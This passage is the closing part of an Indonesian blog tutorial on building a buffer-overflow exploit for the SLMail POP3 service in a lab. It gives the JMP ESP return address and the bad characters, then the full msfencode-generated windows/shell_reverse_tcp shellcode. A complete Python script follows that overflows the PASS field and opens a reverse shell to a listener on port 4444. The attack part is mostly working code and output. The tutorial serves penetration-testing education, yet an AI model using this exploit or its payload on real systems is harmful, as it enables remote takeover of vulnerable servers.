<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/nilai-eip-sama-dengan-esp.png" class="align-center" alt="install gpg"></p>

<p>Seperti yang kita lihat diatas, CPU telah berhasil loncat atau “JUMP”
 ke register ESP. Hal ini ditandai dengan nilai EIP yang sama dengan 
alamat memory yang ditunjuk oleh register ESP.</p>

<p>Dengan hasil pengujian ini, kita bisa simpulkan bahwa kita bisa 
menggunakan instruksi “JMP ESP” yang berada di lokasi memory \x5F4A358F 
sesuai dengan temuan MONA.</p>

<p>Berikut video singkat yang menjelaskan proses diatas. Agar text di 
video terbaca, gunakan HD di setting video yang tersedia di menu 
youtube.</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/youtube-hd.png" class="align-center" alt="install gpg"></p>

<div style="text-align:center">
  <iframe src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/slz4Uwy2DBY.html" allowfullscreen="" width="640" height="480" frameborder="0"></iframe>
</div>

<p><span style="color:red"><strong>iv.Menfinalisasi Script Exploit.</strong></span></p>

<p>Kini tiba saat yang menyenangkan yaitu memfinalisasi script yang akan
 kita gunakan untuk mengexploitasi kerentanan buffer overflow di SLMAIL 
POP3</p>

<p>Berikut hasil yang kita peroleh setelah melalui proses diatas:</p>

<ol>
  <li>
    <p>Nilai register EIP bisa ditimpa (di-overwrite) setelah jumlah 
karakter yang dikirim sebagai bagian dari password mencapai 2606 
karakter. Nilai EIP ini akan ditimpa dengan lokasi memory yang menyimpan
 instruksi “JMP ESP” agar CPU dapat mengeksekusi program shell kita yang
 tersimpan di lokasi memory yang ditunjuk (di-pointing) oleh register 
ESP</p>
  </li>
  <li>
    <p>Ruang memory yang ditunjuk (di-pointing) oleh register ESP dapat 
dimanfaatkan untuk menyimpan program shell kita karena saat layanana 
SLMAIL POP3 crash (hang), register ini menunjuk (pointing) ke lokasi 
memory yang menyimpan sisa karakter setelah karakter yang menimpa 
(meng-overwrite) EIP. Dengan demikian, kita akan mengganti sisa karakter
 ini dengan program shell kita. Selain itu, ruang memory yang ditunjuk 
oleh register ESP ini cukup untuk menampung program shell yang minimum 
membutuhkan sebesar 450 bytes</p>
  </li>
  <li>
    <p>Karakter “\x00\x0A\x0D” telah teridentifikasi sebagai “bad 
character” sehingga kita perlu memastikan program shell kita tidak 
menggunakan karakter-karakter ini.</p>
  </li>
</ol>

<p>Selanjutnya, kita akan membuat program shell yang akan menjadi bagian
 dari pengiriman karakter password ke SLMAIL POP3. Program ini biasa 
disebut dengan istilah “PAYLOAD” karena merupakan program yang 
diinginkan oleh attacker untuk dieksekusi oleh system setelah proses 
exploitasi selesai.</p>

<p>Tentunya program shell ini sudah harus dalam format atau instruksi 
yang dapat dimengerti oleh CPU karena program ini akan langsung 
dieksekusi oleh CPU melalui memory.</p>

<p>Pembuatan program shell ini bisa dilakukan secara manual atau 
menggunakan contoh/template yang disediakan oleh metasploit. Agar 
pembahasan ini bisa lebih sederhana, kita akan menggunakan metasploit 
untuk menghasilkan program shell ini.</p>

<p>Berikut langkah pembuatan program shell menggunakan metasploit</p>

<p>1.Jalankan program “msfpayload” dengan memilih “windows/shell_reverse_tcp” sebagai payload</p>

<p>2.Karena ini adalah reverse shell, maka kita perlu memberitahu alamat
 IP dan TCP port komputer kita agar sistem operasi yang menjalankan 
SLMAIL dapat menginisiasi atau memulai koneksi shell ke komputer kita. 
sebagai contoh, saya menggunakan IP kali linux saya di 172.16.192.128</p>

<p>3.PIPE hasil msfpayload ke msfencode karena kita ingin program shell 
(PAYLOAD) menghindari karakter yang tidak diperbolehkan. Gambar dibawah 
ini perintah lengkap yang menggabungkan mspayload dengan msfencode</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/msfpayload-msfencode.png" class="align-center" alt="install gpg"></p>

<p>4.Masukan program shell yang dihasilkan oleh msfpayload ke variable 
password_akhir. Program shell yang dihasilkan dapat dilihat dibawah ini</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="s">"</span><span class="se">\xb8\x9c\x1e\x99\x6e\xd9\xeb\xd9\x74\x24\xf4\x5f\x29\xc9</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\xb1\x4f\x31\x47\x14\x03\x47\x14\x83\xc7\x04\x7e\xeb\x65</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x86\xf7\x14\x96\x57\x67\x9c\x73\x66\xb5\xfa\xf0\xdb\x09</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x88\x55\xd0\xe2\xdc\x4d\x63\x86\xc8\x62\xc4\x2c\x2f\x4c</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\xd5\x81\xef\x02\x15\x80\x93\x58\x4a\x62\xad\x92\x9f\x63</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\xea\xcf\x50\x31\xa3\x84\xc3\xa5\xc0\xd9\xdf\xc4\x06\x56</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x5f\xbe\x23\xa9\x14\x74\x2d\xfa\x85\x03\x65\xe2\xae\x4b</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x56\x13\x62\x88\xaa\x5a\x0f\x7a\x58\x5d\xd9\xb3\xa1\x6f</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x25\x1f\x9c\x5f\xa8\x5e\xd8\x58\x53\x15\x12\x9b\xee\x2d</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\xe1\xe1\x34\xb8\xf4\x42\xbe\x1a\xdd\x73\x13\xfc\x96\x78</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\xd8\x8b\xf1\x9c\xdf\x58\x8a\x99\x54\x5f\x5d\x28\x2e\x7b</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x79\x70\xf4\xe2\xd8\xdc\x5b\x1b\x3a\xb8\x04\xb9\x30\x2b</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x50\xbb\x1a\x24\x95\xf1\xa4\xb4\xb1\x82\xd7\x86\x1e\x38</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x70\xab\xd7\xe6\x87\xcc\xcd\x5e\x17\x33\xee\x9e\x31\xf0</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\xba\xce\x29\xd1\xc2\x85\xa9\xde\x16\x09\xfa\x70\xc9\xe9</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\xaa\x30\xb9\x81\xa0\xbe\xe6\xb1\xca\x14\x91\xf6\x5d\x3b</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\xb2\x38\x1d\x2b\xb1\xb8\x0f\xf0\x3c\x5e\x45\x18\x69\xc9</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\xf2\x81\x30\x81\x63\x4d\xef\x01\x07\xdc\x74\xd1\x4e\xfd</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x22\x86\x07\x33\x3b\x42\xba\x6a\x95\x70\x47\xea\xde\x30</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x9c\xcf\xe1\xb9\x51\x6b\xc6\xa9\xaf\x74\x42\x9d\x7f\x23</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x1c\x4b\xc6\x9d\xee\x25\x90\x72\xb9\xa1\x65\xb9\x7a\xb7</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x69\x94\x0c\x57\xdb\x41\x49\x68\xd4\x05\x5d\x11\x08\xb6</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\xa2\xc8\x88\xc6\xe8\x50\xb8\x4e\xb5\x01\xf8\x12\x46\xfc</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x3f\x2b\xc5\xf4\xbf\xc8\xd5\x7d\xc5\x95\x51\x6e\xb7\x86</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x37\x90\x64\xa6\x1d</span><span class="s">"</span></code></pre></figure>

<p>Berikut ini hasil akhir dari script exploit kita</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>

<span class="kn">import</span> <span class="nn">socket</span>

<span class="n">password_awal</span><span class="o">=</span><span class="s">"C"</span><span class="o">*</span><span class="mi">2606</span> <span class="c">#buat karakter c sebanyak 2606</span>
<span class="n">eip</span><span class="o">=</span><span class="s">"</span><span class="se">\x8F\x35\x4A\x5F</span><span class="s">"</span> <span class="c">#isi register EIP dengan alamat memory yang menyimpan instruksi JMP ESP</span>
<span class="n">softnop</span><span class="o">=</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="o">*</span><span class="mi">10</span>
<span class="n">password_akhir</span><span class="o">=</span><span class="p">(</span><span class="s">"</span><span class="se">\xb8\x9c\x1e\x99\x6e\xd9\xeb\xd9\x74\x24\xf4\x5f\x29\xc9</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\xb1\x4f\x31\x47\x14\x03\x47\x14\x83\xc7\x04\x7e\xeb\x65</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x86\xf7\x14\x96\x57\x67\x9c\x73\x66\xb5\xfa\xf0\xdb\x09</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x88\x55\xd0\xe2\xdc\x4d\x63\x86\xc8\x62\xc4\x2c\x2f\x4c</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\xd5\x81\xef\x02\x15\x80\x93\x58\x4a\x62\xad\x92\x9f\x63</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\xea\xcf\x50\x31\xa3\x84\xc3\xa5\xc0\xd9\xdf\xc4\x06\x56</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x5f\xbe\x23\xa9\x14\x74\x2d\xfa\x85\x03\x65\xe2\xae\x4b</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x56\x13\x62\x88\xaa\x5a\x0f\x7a\x58\x5d\xd9\xb3\xa1\x6f</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x25\x1f\x9c\x5f\xa8\x5e\xd8\x58\x53\x15\x12\x9b\xee\x2d</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\xe1\xe1\x34\xb8\xf4\x42\xbe\x1a\xdd\x73\x13\xfc\x96\x78</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\xd8\x8b\xf1\x9c\xdf\x58\x8a\x99\x54\x5f\x5d\x28\x2e\x7b</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x79\x70\xf4\xe2\xd8\xdc\x5b\x1b\x3a\xb8\x04\xb9\x30\x2b</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x50\xbb\x1a\x24\x95\xf1\xa4\xb4\xb1\x82\xd7\x86\x1e\x38</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x70\xab\xd7\xe6\x87\xcc\xcd\x5e\x17\x33\xee\x9e\x31\xf0</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\xba\xce\x29\xd1\xc2\x85\xa9\xde\x16\x09\xfa\x70\xc9\xe9</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\xaa\x30\xb9\x81\xa0\xbe\xe6\xb1\xca\x14\x91\xf6\x5d\x3b</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\xb2\x38\x1d\x2b\xb1\xb8\x0f\xf0\x3c\x5e\x45\x18\x69\xc9</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\xf2\x81\x30\x81\x63\x4d\xef\x01\x07\xdc\x74\xd1\x4e\xfd</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x22\x86\x07\x33\x3b\x42\xba\x6a\x95\x70\x47\xea\xde\x30</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x9c\xcf\xe1\xb9\x51\x6b\xc6\xa9\xaf\x74\x42\x9d\x7f\x23</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x1c\x4b\xc6\x9d\xee\x25\x90\x72\xb9\xa1\x65\xb9\x7a\xb7</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x69\x94\x0c\x57\xdb\x41\x49\x68\xd4\x05\x5d\x11\x08\xb6</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\xa2\xc8\x88\xc6\xe8\x50\xb8\x4e\xb5\x01\xf8\x12\x46\xfc</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x3f\x2b\xc5\xf4\xbf\xc8\xd5\x7d\xc5\x95\x51\x6e\xb7\x86</span><span class="s">"</span> <span class="o">+</span>
<span class="s">"</span><span class="se">\x37\x90\x64\xa6\x1d</span><span class="s">"</span><span class="p">)</span> <span class="c"># program shell atau PAYLOAD kita</span>


<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>	<span class="c">#definisikan koneksi TCP/IP soket</span>

<span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">Berkomunikasi dengan POP3.....</span><span class="se">\n</span><span class="s">"</span>
<span class="n">connect</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">'172.16.192.130'</span><span class="p">,</span><span class="mi">110</span><span class="p">))</span>		<span class="c">#Koneksi ke POP3 server</span>
<span class="n">data</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>					<span class="c">#pesan balasan dari server</span>
<span class="k">print</span> <span class="n">data</span>						<span class="c">#print ke layar supaya kita tau statusnya</span>

<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'USER adinanta</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>				<span class="c">#kirim username adinanta (username apa aja bisa)</span>
<span class="n">data</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>					<span class="c">#pesat balasan server</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'PASS '</span><span class="o">+</span><span class="n">password_awal</span><span class="o">+</span><span class="n">eip</span><span class="o">+</span><span class="n">softnop</span><span class="o">+</span><span class="n">password_akhir</span><span class="o">+</span><span class="s">'</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>	<span class="c">#kirim string password ke server</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'QUIT</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>					<span class="c">#keluar dari komunikasi pop3</span>
<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>						<span class="c">#putus tcp/ip connection</span></code></pre></figure>

<p><span style="color:red"><strong>v. Menjalankan Exploit.</strong></span></p>

<p>Ini bagian terakhir dan kesimpulan dari semua pembahasan yang 
membosankan sebelumnya. Kita akan menjalankan program netcat di kali 
linux untuk menerima permintaan koneksi shell dari sistem operasi yang 
menjalankan SLMAIL POP3.</p>

<p>Berikut langkah akhir proses eksploitasi:</p>

<p>1.Jalankan netcat di kali linux sebagai TCP/IP server yang berjalan di port 4444 seperti tertera dibawah ini</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/netcat-listening-4444.png" class="align-center" alt="install gpg"></p>

<p>2.Buka tab terminal baru dan jalankan script exploit yang telah kita finalisasikan diatas</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/run-final-exploit-script.png" class="align-center" alt="install gpg"></p>

<p>3.Lihat hasil reverse_shell (program shell yang jalan dan diinisiasi 
oleh sistem operasi yang menjalankan SLMAIL) di terminal yang 
menjalankan netcat</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/reverse_shell_executed.png" class="align-center" alt="install gpg"></p>

<p>Berikut video singkat yang menjelaskan proses diatas. Agar text di 
video terbaca, gunakan HD di setting video yang tersedia di menu 
youtube.</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/youtube-hd.png" class="align-center" alt="install gpg"></p>

<div style="text-align:center">
  <iframe src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/IDa-MYO7QNw.html" allowfullscreen="" width="640" height="480" frameborder="0"></iframe>
</div>

<h3 id="resources-">Resources <a name="resources"></a></h3>

<p>Seluruh script python yang digunakan dalam tutorial ini tersedia di repository git saya yang dapat diclone melalui <a href="https://github.com/adinanta/slmail-exploit.git">https://github.com/adinanta/slmail-exploit.git</a></p>

<h3 id="selanjutnya-">Selanjutnya <a name="selanjutnya"></a></h3>

<p>Selamat mencoba di lab masing-masing. Apabila ada ketidakjelasan atau
 kesalahan dalam tutorial ini, mohon berikan komentar dan saya akan coba
 memperbaiki.</p>

<p>Salam,</p>

<p>Harry Adinanta</p>

      </div>
      
        
  <div id="disqus_thread"><iframe id="dsq-app953" name="dsq-app953" allowtransparency="true" scrolling="no" tabindex="0" title="Disqus" src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/a.html" style="height: 432px !important;" horizontalscrolling="no" verticalscrolling="no" width="100%" frameborder="0"></iframe></div>
  <script>
    var disqus_config = function () {
      this.page.url = 'https://harryadinanta.com/exploitasi/2014/12/23/Cara-Membuat-Exploit-Untuk-Buffer-Overflow.html';
      this.page.identifier = 'https://harryadinanta.com/exploitasi/2014/12/23/Cara-Membuat-Exploit-Untuk-Buffer-Overflow.html';
    };

    (function() {
      var d = document, s = d.createElement('script');
      s.src = 'https://adinanta.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  </script>
  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

      
    </article>
  </div>
</main>

        </div>

        <div class="search-content">
          <div class="inner">
  <div tabindex="-1" class="search-searchbar"><div class="ais-search-box"><input autocapitalize="off" autocomplete="off" autocorrect="off" placeholder="Enter your search term..." role="textbox" spellcheck="false" type="text" class="ais-search-box--input"><span class=""><div class="ais-search-box--powered-by">
  Search by
  <a class="ais-search-box--powered-by-link" href="https://www.algolia.com/?utm_source=instantsearch.js&amp;utm_medium=website&amp;utm_content=harryadinanta.com&amp;utm_campaign=poweredby" target="_blank">Algolia</a>
</div></span><span class="ais-search-box--magnifier-wrapper"><div class="ais-search-box--magnifier">
  <svg xmlns="http://www.w3.org/2000/svg" id="sbx-icon-search-13" viewBox="0 0 40 40" width="100%" height="100%">
    <path d="M26.804 29.01c-2.832 2.34-6.465 3.746-10.426 3.746C7.333 32.756 0 25.424 0 16.378 0 7.333 7.333 0 16.378 0c9.046 0 16.378 7.333 16.378 16.378 0 3.96-1.406 7.594-3.746 10.426l10.534 10.534c.607.607.61 1.59-.004 2.202-.61.61-1.597.61-2.202.004L26.804 29.01zm-10.426.627c7.323 0 13.26-5.936 13.26-13.26 0-7.32-5.937-13.257-13.26-13.257C9.056 3.12 3.12 9.056 3.12 16.378c0 7.323 5.936 13.26 13.258 13.26z" fill-rule="evenodd">
    </path>
  </svg>
</div></span><span class="ais-search-box--reset-wrapper" style="display: none;"><button type="reset" title="Clear the search query." class="ais-search-box--reset">
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width="100%" height="100%">
    <path d="M8.114 10L.944 2.83 0 1.885 1.886 0l.943.943L10 8.113l7.17-7.17.944-.943L20 1.886l-.943.943-7.17 7.17 7.17 7.17.943.944L18.114 20l-.943-.943-7.17-7.17-7.17 7.17-.944.943L0 18.114l.943-.943L8.113 10z" fill-rule="evenodd">
    </path>
  </svg>
</button></span></div></div>
        <div class="search-hits"><div class="ais-hits"><div class="ais-hits--item">
    <article class="entry">
      <h3 class="entry-title"><a href="https://harryadinanta.com/lain-lain/2018/02/26/hosting-konten-statis.html">Hosting konten statis di Google Cloud</a></h3>
      <div class="entry-excerpt"><p>Pada kesempatan ini saya ingin membahas secara singkat tentang penggunaan google cloud untuk <em>hosting</em> konten statis. Topik ini tidak berhubungan dengan cyber security namun tetap menarik untuk dibahas.</p></div>
    </article>
  </div><div class="ais-hits--item">
    <article class="entry">
      <h3 class="entry-title"><a href="https://harryadinanta.com/tools/2018/02/05/Ekstrak-Kredensial.html">Mengekstrak Informasi Kredensial</a></h3>
      <div class="entry-excerpt"><p>Informasi kredensial seperti <strong>username</strong> dan <strong>password</strong> dalam beberapa kasus kerap kali tercatat dalam log file. Bagi penguji keamanan Informasi atau <em>penetration tester</em>,
 Informasi seperti ini sangat bermanfaat bahkan tidak jarang dapat 
membantu mereka dalam memperluas penguasaan terhadap sistem atau 
aplikasi lainnya. Oleh sebab itu proses ekstraksi Informasi kredensial 
dari <em>log file</em> atau <em>debug file</em> tidak boleh 
dikesampingkan. Berikut beberapa kasus dimana membaca dan menganalisa 
log file, debug file atau file sejenis dapat bermanfaat:</p></div>
    </article>
  </div><div class="ais-hits--item">
    <article class="entry">
      <h3 class="entry-title"><a href="https://harryadinanta.com/walkthrough/2017/11/24/Instalasi-Nethunter.html">Instalasi Nethunter Kali Linux</a></h3>
      <div class="entry-excerpt"><p>Kali Linux Nethunter adalah versi Kali Linux yang jalan dan disandingkan dengan Sistem Operasi Android melalui teknik <strong>overlay</strong>. Dengan metode ini, Sistem Operasi Kali Linux berjalan dengan kondisi <strong>chroot</strong>
 diatas android kernel yang telah dikustomisasi. Sebagai referensi, 
overlay adalah teknik yang digunakan untuk memuat lebih dari satu kode 
program ke dalam segmen RAM yang sama dan dapat di-load kapan saja saat <em>runtime</em> apabila dibutuhkan.</p></div>
    </article>
  </div><div class="ais-hits--item">
    <article class="entry">
      <h3 class="entry-title"><a href="https://harryadinanta.com/cheatsheet/2017/06/08/Git-CheatSheet.html">Git CheatSheet</a></h3>
      <div class="entry-excerpt"><p>This MindMap portray the most 
commonly used git commands. Commands are grouped together according to 
functions they performed. Brief description of each command are written 
under the comment sections and can be viewed using xmind software.</p></div>
    </article>
  </div><div class="ais-hits--item">
    <article class="entry">
      <h3 class="entry-title"><a href="https://harryadinanta.com/training/2017/05/23/Training-Pentest.html">Pelatihan Offensive Penetration Test</a></h3>
      <div class="entry-excerpt"><p>Salah satu cara untuk membangun 
sistem keamanan informasi yang mampu mengantisipasi ancaman cyberattack 
adalah dengan menerapkan metode offensive yaitu pendekatan yang bersifat
 proaktif. Melalui pendekatan penetration testing yang bersifat 
offensive, sebuah perusahaan dapat melakukan pengujian keamanan 
Informasi dengan cara melakukan simulasi penyerangan atau cyberattack.</p></div>
    </article>
  </div><div class="ais-hits--item">
    <article class="entry">
      <h3 class="entry-title"><a href="https://harryadinanta.com/exploitasi/2016/11/30/Eskalasi-Hak-Akses-Melalui-DAVFS2.html">Eskalasi Hak Akses Melalui DAVFS2</a></h3>
      <div class="entry-excerpt"><p>DAVFS2 adalah program yang digunakan
 untuk mengakses Web Distributed Authoring and Versioning atau biasa 
disebut WebDAV. Dengan DAVFS2, kita dapat mounting web resources seperti
 layaknya mounting Unix/Linux resource lainnya. Program ini bisa diunduh
 di <a href="http://savannah.nongnu.org/projects/davfs2" title="DAVFS2">davfs2 project</a></p></div>
    </article>
  </div><div class="ais-hits--item">
    <article class="entry">
      <h3 class="entry-title"><a href="https://harryadinanta.com/walkthrough/2016/10/30/PwnLab-init-Walk-Through.html">PwnLab:init Walk Through</a></h3>
      <div class="entry-excerpt"><p>PwnLab:init adalah sebuah Virtual 
Machine (VM) dimana Sistem Operasi dan aplikasi yang berjalan diatasnya 
sengaja dibuat rentan / vulnerable sehingga dapat dieksploitasi. 
Tujuannya adalah agar kita dapat belajar mendeteksi, menganalisa dan 
kemudian mengeksploitasi kelemahan maupun kesalahan konfigurasi yang ada
 pada Aplikasi dan Sistem Operasi. Proses pembelajaran ini sangat 
berguna bagi kita yang berprofesi sebagai penguji keamanan Informasi / 
Security Penetration Tester dan juga yang bertugas mengamankan aset 
Informasi / Security defense professional.</p></div>
    </article>
  </div><div class="ais-hits--item">
    <article class="entry">
      <h3 class="entry-title"><a href="https://harryadinanta.com/walkthrough/2016/09/16/Stapler-1-Walk-Through.html">Stapler:1 Walk Through</a></h3>
      <div class="entry-excerpt"><p>Stapler:1 adalah sebuah Virtual 
Machine (VM) dimana Sistem Operasi dan aplikasi yang berjalan diatasnya 
sengaja dibuat rentan / vulnerable sehingga dapat dieksploitasi. 
Tujuannya adalah agar kita dapat belajar mendeteksi, menganalisa dan 
kemudian mengeksploitasi kelemahan maupun kesalahan konfigurasi yang ada
 pada Aplikasi dan Sistem Operasi. Proses pembelajaran ini sangat 
berguna bagi kita yang berprofesi sebagai penguji keamanan Informasi / 
Security Penetration Tester dan juga yang bertugas mengamankan aset 
Informasi / Security defense professional.</p></div>
    </article>
  </div><div class="ais-hits--item">
    <article class="entry">
      <h3 class="entry-title"><a href="https://harryadinanta.com/exploitasi/2015/06/24/Using-sqlmap-to-exploit-sql-injection-running-on-top-of-ASP-NET-and-MSSQL-2012.html">Using sqlmap to exploit sql injection on ASP.NET and MSSQL 2012</a></h3>
      <div class="entry-excerpt"><p>SQL Injection is a technique whereby
 attacker insert malicious SQL statement into application inputs in an 
attempt to take control of the application behavior. SQL Injection flaw 
can be seen as one of the oldest vulnerability that still exists in 
todays applications.</p></div>
    </article>
  </div><div class="ais-hits--item">
    <article class="entry">
      <h3 class="entry-title"><a href="https://harryadinanta.com/exploitasi/2015/04/17/Exploit-RFI-dan-Eskalasi-Hak-Akses.html">Exploit RFI dan Eskalasi Hak Akses</a></h3>
      <div class="entry-excerpt"><p>Remote File Inclusion (RFI) adalah 
kerentanan pada aplikasi dimana attacker dapat menginstruksikan aplikasi
 agar menyertakan file yang tersimpan di luar sistem untuk menjadi 
bagian dari proses eksekusi. Dalam kata lain, attacker menyiapkan 
program tambahan yang tersimpan diluar sistem target dan kemudian 
menginstruksikan aplikasi target untuk mengeksekusi program tersebut. 
Berikut ini ilustrasi exploitasi kerentanan RFI</p></div>
    </article>
  </div><div class="ais-hits--item">
    <article class="entry">
      <h3 class="entry-title"><a href="https://harryadinanta.com/exploitasi/2015/03/01/Exploitasi-Shellshock-dan-eskalasi-hak-akses.html">Exploitasi Shellshock dan eskalasi hak akses</a></h3>
      <div class="entry-excerpt"><p>Kerentanan Shellshock atau Bashdoor baru saja dipublikasikan tahun lalu dan informasi selengkapnya bisa dilihat di <a href="https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29">wikipedia</a>.
 Kerentanan ini menimpa program shell bernama BASH yang biasa digunakan 
oleh sistem operasi berbasis GNU Unix dan Linux. Shell adalah 
command-line interpreter atau antarmuka yang digunakan oleh user dalam 
berinteraksi atau memberikan perintah ke Sistem Operasi.</p></div>
    </article>
  </div><div class="ais-hits--item">
    <article class="entry">
      <h3 class="entry-title"><a href="https://harryadinanta.com/exploitasi/2015/01/05/Exploit-PSExec-dan-Bypass-Anti-Virus.html">Exploit PSExec dan Bypass Anti Virus</a></h3>
      <div class="entry-excerpt"><p>Terkadang kita menemui situasi 
dimana password atau hash administrator suatu system telah diketahui 
namun layanan interaktif seperti remote desktop tidak tersedia sehingga 
membatasi kita untuk mengambil-alih system tersebut secara penuh. 
Ketidaktersediaan layanan interaktif ini bisa saja disebabkan oleh 
firewall yang memblokir port 3389 atau layanan tersebut memang sengaja 
tidak diaktifkan. Sebagai ilustrasi, berikut hasil nmap atas target yang
 ingin kita ambil-alih dimana target tersebut hanya memberikan layanan 
Server Message Block (SMB berjalan di TCP port 139 dan 445) atau lebih 
dikenal dengan FILE SHARING. Selain itu target membuka beberapa layanan 
terkait dengan RPC dan koneksi ke active directory.</p></div>
    </article>
  </div><div class="ais-hits--item">
    <article class="entry">
      <h3 class="entry-title"><a href="https://harryadinanta.com/exploitasi/2014/12/23/Cara-Membuat-Exploit-Untuk-Buffer-Overflow.html">Cara Membuat Exploit Untuk Buffer Overflow</a></h3>
      <div class="entry-excerpt"><p>Istilah <span style="color:red"><strong>“Buffer Overflow”</strong></span>
 mungkin sudah tidak asing lagi bagi sebagian besar praktisi IT. Istilah
 ini sering digunakan untuk menjelaskan penyebab suatu software atau 
sistem yang berhenti bekerja (hang atau not-responding) saat melakukan 
suatu proses meskipun tidak semua kejadian hang atau not-responding 
disebabkan oleh buffer overflow.</p></div>
    </article>
  </div><div class="ais-hits--item">
    <article class="entry">
      <h3 class="entry-title"><a href="https://harryadinanta.com/exploitasi/2014/08/08/Local-File-Inclusion.html">Local File Inclusion (LFI)</a></h3>
      <div class="entry-excerpt"><p>Local File Inclusion (LFI) adalah 
